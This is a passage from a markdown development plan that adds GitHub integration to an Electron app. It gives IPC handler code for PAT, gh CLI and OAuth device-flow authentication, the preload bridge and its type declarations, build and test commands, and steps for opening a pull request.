      expiryObservable: !!v.expiresAt,
    })
    return { ok: true, id }
  })

  ipcMain.handle(IPC.GITHUB_PROFILE_ADOPT_GHCLI, async (_e, username: string) => {
    // Verify token exists via ghAuthToken
    try {
      await ghAuthToken(username, defaultGhRun())
    } catch (e) {
      return { ok: false, error: 'gh auth token failed' }
    }
    const id = await profileStore.addProfile({
      kind: 'gh-cli',
      label: username,
      username,
      scopes: [],
      capabilities: ['pulls', 'issues', 'contents', 'statuses', 'checks', 'actions', 'notifications'],
      ghCliUsername: username,
      expiryObservable: false,
    })
    return { ok: true, id }
  })

  ipcMain.handle(IPC.GITHUB_PROFILE_REMOVE, async (_e, id: string) => {
    await profileStore.removeProfile(id)
    return { ok: true }
  })

  ipcMain.handle(IPC.GITHUB_PROFILE_RENAME, async (_e, id: string, label: string) => {
    await profileStore.updateProfile(id, { label })
    return { ok: true }
  })

  ipcMain.handle(IPC.GITHUB_PROFILE_TEST, async (_e, id: string) => {
    const token = await profileStore.getToken(id)
    if (!token) return { ok: false, error: 'no-token' }
    const v = await verifyToken(token)
    return v ? { ok: true, ...v } : { ok: false, error: 'invalid' }
  })

  ipcMain.handle(IPC.GITHUB_OAUTH_START, async (_e, mode: 'public' | 'private') => {
    const scope = mode === 'private' ? OAUTH_SCOPES_PRIVATE : OAUTH_SCOPES_PUBLIC
    const resp = await requestDeviceCode(scope)
    activeFlows.set(resp.device_code, {
      deviceCode: resp.device_code,
      intervalSec: resp.interval,
      scope,
      cancelled: false,
    })
    return {
      flowId: resp.device_code,
      userCode: resp.user_code,
      verificationUri: resp.verification_uri,
      expiresIn: resp.expires_in,
      interval: resp.interval,
    }
  })

  ipcMain.handle(IPC.GITHUB_OAUTH_POLL, async (_e, flowId: string) => {
    const flow = activeFlows.get(flowId)
    if (!flow) return { ok: false, error: 'not-found' }
    try {
      const r = await pollForAccessToken(
        flow.deviceCode,
        flow.intervalSec,
        undefined,
        () => flow.cancelled,
      )
      if (r.access_token) {
        const v = await verifyToken(r.access_token)
        if (!v) { activeFlows.delete(flowId); return { ok: false, error: 'verify-failed' } }
        const caps = scopesToCapabilities('oauth', v.scopes)
        const id = await profileStore.addProfile({
          kind: 'oauth',
          label: v.username,
          username: v.username,
          avatarUrl: v.avatarUrl,
          scopes: v.scopes,
          capabilities: caps,
          rawToken: r.access_token,
          expiryObservable: false,
        })
        activeFlows.delete(flowId)
        return { ok: true, profileId: id }
      }
      if (r.error === 'cancelled') {
        activeFlows.delete(flowId)
        return { ok: false, error: 'cancelled' }
      }
      return { ok: false, error: 'pending' }
    } catch (e) {
      return { ok: false, error: String(e) }
    }
  })

  ipcMain.handle(IPC.GITHUB_OAUTH_CANCEL, async (_e, flowId: string) => {
    const f = activeFlows.get(flowId)
    if (f) f.cancelled = true
    activeFlows.delete(flowId)
    return { ok: true }
  })

  ipcMain.handle(IPC.GITHUB_GHCLI_DETECT, async () => {
    const users = await ghAuthStatus(defaultGhRun())
    return { ok: true, users }
  })

  ipcMain.handle(IPC.GITHUB_REPO_DETECT, async (_e, cwd: string) => {
    const slug = await detectRepoFromCwd(cwd, defaultGitRun())
    return { ok: true, slug }
  })

  ipcMain.handle(IPC.GITHUB_SESSION_CONFIG_UPDATE, async (
    _e, sessionId: string, patch: Partial<SessionGitHubIntegration>,
  ) => {
    const sessions = await deps.loadSessions()
    const idx = sessions.findIndex((s) => s.id === sessionId)
    if (idx < 0) return { ok: false, error: 'not-found' }
    const current = sessions[idx].githubIntegration ?? {
      enabled: false, autoDetected: false,
    }
    sessions[idx] = {
      ...sessions[idx],
      githubIntegration: { ...current, ...patch } as SessionGitHubIntegration,
    }
    await deps.saveSessions(sessions)
    return { ok: true }
  })

  ipcMain.handle(IPC.GITHUB_LOCALGIT_GET, async (_e, cwd: string) => {
    const state = await readLocalGitState(cwd, defaultGitRun())
    return { ok: true, state }
  })

  // Stubs for Plan 3 — data fetching + sync control
  ipcMain.handle(IPC.GITHUB_DATA_GET, async () => ({ ok: true, data: null }))
  ipcMain.handle(IPC.GITHUB_SESSION_CONTEXT_GET, async () => ({ ok: true, data: null }))
  ipcMain.handle(IPC.GITHUB_SYNC_NOW, async () => ({ ok: true }))
  ipcMain.handle(IPC.GITHUB_SYNC_PAUSE, async () => ({ ok: true }))
  ipcMain.handle(IPC.GITHUB_SYNC_RESUME, async () => ({ ok: true }))
  ipcMain.handle(IPC.GITHUB_ACTIONS_RERUN, async () => ({ ok: true }))
  ipcMain.handle(IPC.GITHUB_PR_MERGE, async () => ({ ok: true }))
  ipcMain.handle(IPC.GITHUB_PR_READY, async () => ({ ok: true }))
  ipcMain.handle(IPC.GITHUB_REVIEW_REPLY, async () => ({ ok: true }))
  ipcMain.handle(IPC.GITHUB_NOTIF_MARK_READ, async () => ({ ok: true }))
}

async function emptyConfigFrom(s: GitHubConfigStore): Promise<GitHubConfig> {
  const { DEFAULT_SYNC_INTERVALS, DEFAULT_FEATURE_TOGGLES, GITHUB_CONFIG_SCHEMA_VERSION } =
    await import('../../shared/github-constants')
  return {
    schemaVersion: GITHUB_CONFIG_SCHEMA_VERSION,
    authProfiles: {},
    featureToggles: { ...DEFAULT_FEATURE_TOGGLES },
    syncIntervals: { ...DEFAULT_SYNC_INTERVALS },
    enabledByDefault: false,
    transcriptScanningOptIn: false,
  }
}
```

- [ ] **Step 3: Register in `src/main/index.ts`**

Find the block where existing handlers are registered (search for `registerTokenomicsHandlers` or similar). Add after their registration, once `resourcesDir` and session load/save helpers are available:

```ts
import { registerGitHubHandlers } from './ipc/github-handlers'

// ...inside app-ready block, after resourcesDir is set:
registerGitHubHandlers({
  resourcesDir,
  getWindow: () => mainWindow,
  loadSessions: async () => (await loadConfig()).sessions ?? [],  // adapt to existing API
  saveSessions: async (sessions) => {
    const cfg = await loadConfig()
    await saveConfig({ ...cfg, sessions })
  },
})
```

Adjust `loadConfig`/`saveConfig` naming to match what the codebase already uses (inspect `config-manager.ts` and follow its exact signatures).

- [ ] **Step 4: Typecheck + build**

```bash
npm run typecheck
npm run build
```

- [ ] **Step 5: Commit**

```bash
git add src/main/ipc/github-handlers.ts src/main/index.ts
git commit -m "feat(github): register IPC handlers + wire session config persistence"
```

---

### Task H2: Preload + electron.d.ts

**Files:** MODIFY `src/preload/index.ts`, `src/renderer/types/electron.d.ts`.

- [ ] **Step 1: Extend preload**

The existing preload exposes the renderer API as `electronAPI` (not `electron`) via `contextBridge.exposeInMainWorld('electronAPI', electronAPI)`. Also exposed separately: `contextBridge.exposeInMainWorld('electronPlatform', process.platform)`. Extend the existing `electronAPI` object by adding a `github` key inside it; do NOT introduce a separate `window.electron` root.

```ts
// Inside the existing `const electronAPI: ElectronAPI = { ... }` object:

```ts
github: {
  getConfig: () => ipcRenderer.invoke(IPC.GITHUB_CONFIG_GET),
  updateConfig: (patch: any) => ipcRenderer.invoke(IPC.GITHUB_CONFIG_UPDATE, patch),
  addPat: (input: any) => ipcRenderer.invoke(IPC.GITHUB_PROFILE_ADD_PAT, input),
  adoptGhCli: (username: string) => ipcRenderer.invoke(IPC.GITHUB_PROFILE_ADOPT_GHCLI, username),
  removeProfile: (id: string) => ipcRenderer.invoke(IPC.GITHUB_PROFILE_REMOVE, id),
  renameProfile: (id: string, label: string) =>
    ipcRenderer.invoke(IPC.GITHUB_PROFILE_RENAME, id, label),
  testProfile: (id: string) => ipcRenderer.invoke(IPC.GITHUB_PROFILE_TEST, id),
  oauthStart: (mode: 'public' | 'private') =>
    ipcRenderer.invoke(IPC.GITHUB_OAUTH_START, mode),
  oauthPoll: (flowId: string) => ipcRenderer.invoke(IPC.GITHUB_OAUTH_POLL, flowId),
  oauthCancel: (flowId: string) => ipcRenderer.invoke(IPC.GITHUB_OAUTH_CANCEL, flowId),
  ghcliDetect: () => ipcRenderer.invoke(IPC.GITHUB_GHCLI_DETECT),
  repoDetect: (cwd: string) => ipcRenderer.invoke(IPC.GITHUB_REPO_DETECT, cwd),
  updateSessionConfig: (sessionId: string, patch: any) =>
    ipcRenderer.invoke(IPC.GITHUB_SESSION_CONFIG_UPDATE, sessionId, patch),
  getLocalGit: (cwd: string) => ipcRenderer.invoke(IPC.GITHUB_LOCALGIT_GET, cwd),
  syncNow: (sessionId: string) => ipcRenderer.invoke(IPC.GITHUB_SYNC_NOW, sessionId),
  syncPause: () => ipcRenderer.invoke(IPC.GITHUB_SYNC_PAUSE),
  syncResume: () => ipcRenderer.invoke(IPC.GITHUB_SYNC_RESUME),
  getData: (slug: string) => ipcRenderer.invoke(IPC.GITHUB_DATA_GET, slug),
  getSessionContext: (sessionId: string) =>
    ipcRenderer.invoke(IPC.GITHUB_SESSION_CONTEXT_GET, sessionId),
  onDataUpdate: (cb: (p: any) => void) => {
    const l = (_e: any, p: any) => cb(p)
    ipcRenderer.on(IPC.GITHUB_DATA_UPDATE, l)
    return () => ipcRenderer.removeListener(IPC.GITHUB_DATA_UPDATE, l)
  },
  onSyncStateUpdate: (cb: (p: any) => void) => {
    const l = (_e: any, p: any) => cb(p)
    ipcRenderer.on(IPC.GITHUB_SYNC_STATE_UPDATE, l)
    return () => ipcRenderer.removeListener(IPC.GITHUB_SYNC_STATE_UPDATE, l)
  },
  rerunActionsRun: (slug: string, runId: number) =>
    ipcRenderer.invoke(IPC.GITHUB_ACTIONS_RERUN, slug, runId),
  mergePR: (slug: string, prNumber: number, method: 'merge' | 'squash' | 'rebase') =>
    ipcRenderer.invoke(IPC.GITHUB_PR_MERGE, slug, prNumber, method),
  readyPR: (slug: string, prNumber: number) =>
    ipcRenderer.invoke(IPC.GITHUB_PR_READY, slug, prNumber),
  replyToReview: (slug: string, threadId: string, body: string) =>
    ipcRenderer.invoke(IPC.GITHUB_REVIEW_REPLY, slug, threadId, body),
  markNotifRead: (profileId: string, notifId: string) =>
    ipcRenderer.invoke(IPC.GITHUB_NOTIF_MARK_READ, profileId, notifId),
},
```

- [ ] **Step 2: Extend `electron.d.ts`**

Add to the `ElectronAPI` interface (the one referenced by `window.electronAPI`):

```ts
github: {
  getConfig: () => Promise<import('../../shared/github-types').GitHubConfig | null>
  updateConfig: (patch: Partial<import('../../shared/github-types').GitHubConfig>) =>
    Promise<import('../../shared/github-types').GitHubConfig>
  addPat: (input: {
    kind: 'pat-classic' | 'pat-fine-grained'
    label: string
    rawToken: string
    allowedRepos?: string[]
  }) => Promise<{ ok: boolean; id?: string; error?: string }>
  adoptGhCli: (username: string) => Promise<{ ok: boolean; id?: string; error?: string }>
  removeProfile: (id: string) => Promise<{ ok: boolean }>
  renameProfile: (id: string, label: string) => Promise<{ ok: boolean }>
  testProfile: (id: string) => Promise<{
    ok: boolean; username?: string; scopes?: string[]; expiresAt?: number; error?: string
  }>
  oauthStart: (mode: 'public' | 'private') => Promise<{
    flowId: string; userCode: string; verificationUri: string; expiresIn: number; interval: number
  }>
  oauthPoll: (flowId: string) => Promise<{ ok: boolean; profileId?: string; error?: string }>
  oauthCancel: (flowId: string) => Promise<{ ok: boolean }>
  ghcliDetect: () => Promise<{ ok: boolean; users: string[] }>
  repoDetect: (cwd: string) => Promise<{ ok: boolean; slug: string | null }>
  updateSessionConfig: (
    sessionId: string,
    patch: Partial<import('../../shared/github-types').SessionGitHubIntegration>,
  ) => Promise<{ ok: boolean; error?: string }>
  getLocalGit: (cwd: string) => Promise<{
    ok: boolean; state: import('../../shared/github-types').LocalGitState
  }>
  syncNow: (sessionId: string) => Promise<{ ok: boolean }>
  syncPause: () => Promise<{ ok: boolean }>
  syncResume: () => Promise<{ ok: boolean }>
  getData: (slug: string) => Promise<{
    ok: boolean; data: import('../../shared/github-types').RepoCache | null
  }>
  getSessionContext: (sessionId: string) => Promise<{
    ok: boolean; data: import('../../shared/github-types').SessionContextResult | null
  }>
  onDataUpdate: (cb: (p: {
    slug: string; data: import('../../shared/github-types').RepoCache
  }) => void) => () => void
  onSyncStateUpdate: (cb: (p: {
    slug: string; state: 'syncing' | 'synced' | 'rate-limited' | 'error' | 'idle'; at: number; nextResetAt?: number
  }) => void) => () => void
  rerunActionsRun: (slug: string, runId: number) => Promise<{ ok: boolean }>
  mergePR: (slug: string, prNumber: number, method: 'merge' | 'squash' | 'rebase') =>
    Promise<{ ok: boolean }>
  readyPR: (slug: string, prNumber: number) => Promise<{ ok: boolean }>
  replyToReview: (slug: string, threadId: string, body: string) => Promise<{ ok: boolean }>
  markNotifRead: (profileId: string, notifId: string) => Promise<{ ok: boolean }>
}
```

- [ ] **Step 3: Typecheck + build + commit**

```bash
npm run typecheck
npm run build
git add src/preload/index.ts src/renderer/types/electron.d.ts
git commit -m "feat(github): preload bridge + renderer type declarations"
```

---

## Phase Final — Verification + PR

### Task Final.1: Full verification

- [ ] **Step 1: Run all checks**

```bash
npm run typecheck
npx vitest run
npm run build
```
All green.

- [ ] **Step 2: Smoke test IPC from a manual dev session (optional but recommended)**

```bash
npm run dev
```
Open devtools → Console, run:
```js
await window.electronAPI.github.getConfig()   // → null
await window.electronAPI.github.ghcliDetect() // → { ok: true, users: [...] } (if you have gh authed)
```

- [ ] **Step 3: Rebase against latest beta**

```bash
git fetch origin
git rebase origin/beta
```
Resolve any conflicts.

### Task Final.2: Push + PR

- [ ] **Step 1: Push**

```bash
git push -u origin feature/github-sidebar-pr1
```

- [ ] **Step 2: Create PR against beta**

```bash
gh pr create --base beta --title "feat(github): sidebar infrastructure (PR 1/3)" --body "$(cat <<'EOF'
## Summary

- Shared types + IPC channels (`IPC.GITHUB_*`)
- Extend `SavedSession` with optional `githubIntegration`
- Security primitives: token redactor, slug validator, repo URL parser
- Auth: gh CLI delegate (mandatory `--user`), OAuth device flow (DI sleep + cancellable), PAT verifier + repo probe
- GitHub client: ETag cache, per-bucket rate-limit shield, `githubFetch` wrapper, GraphQL + REST fallback (304-aware)
- Cache: LRU eviction, schema version, corrupt-backup retention (keep 3)
- Session: local git reader, repo detector, tool-call inspector (privacy-invariant tests), transcript scanner (opt-in text-only), session context service (priority algorithm)
- IPC handlers registered with real session-config persistence

## Deliberately out of scope (landing in PR 2/3)

- Config page UI, panel shell, any sections → **PR 2**
- Sync orchestrator, onboarding modal, data sections populated → **PR 3**
- SSH session repo detection → **PR 3** (G1b)
- Inline diff viewer → separate spec if/when needed

## Spec

`docs/superpowers/specs/2026-04-17-github-sidebar-design.md` (rev 3)

## Test plan

- [x] Unit tests in `tests/unit/github/*` all pass
- [x] `npm run typecheck` clean
- [x] `npm run build` clean
- [ ] Manual: `window.electronAPI.github.ghcliDetect()` returns authed accounts
- [ ] Manual: Add a fine-grained PAT → appears encrypted in `APP_DEV/github-config.json`

🤖 Generated with [Claude Code](https://claude.com/claude-code)
EOF
)"
```

Return the PR URL to the user for Copilot review.

---

## Self-Review Checklist (for the plan author before handoff)

1. **Spec coverage:** each spec section has a task.
   - §2 auth → Phases C, D, E + Task H1
   - §3 data model → A1, A4, B2, F3
   - §5 per-session persistence → Task H1 (real implementation, not stub)
   - §7 rate-limit → F1, F2, F4
   - §10 security → A5, A6, A7, G3 (privacy invariants)
   - Session Context differentiator (§1) → G5
2. **Type consistency:** `AuthProfile`, `RepoCache`, `SessionGitHubIntegration`, `LocalGitState`, `SessionContextResult` all defined in A1, used consistently.
3. **No orphan imports:** every import points to a file created in a prior task.
4. **File paths realistic:** `src/main/github/` + `tests/unit/github/` structure used throughout.
5. **IPC namespace fixed:** all channels under `IPC.GITHUB_*` (not loose exports).
6. **No `marked` reinstall:** `marked@15` already present.
7. **`SavedSession` used, not `SessionConfig`:** A4 edits the correct interface.
8. **gh CLI safety:** `--user` mandatory in C1; never calls `gh auth switch`; redactor wraps stderr.
9. **Privacy invariants tested:** G3 has 5 explicit "never captures X" tests.
10. **304 handling:** REST fallback returns `{ status: 'unchanged' }` so sync orchestrator (PR 3) doesn't clobber cache.

## Execution Handoff

**REQUIRED SUB-SKILL:** `superpowers:subagent-driven-development` — mandatory for this plan. Dispatch one fresh subagent per task, review between tasks.

**Do not attempt inline execution.** The plan has 20+ tasks, each expected to pass typecheck, tests, and build independently. Subagent dispatch keeps diffs focused.
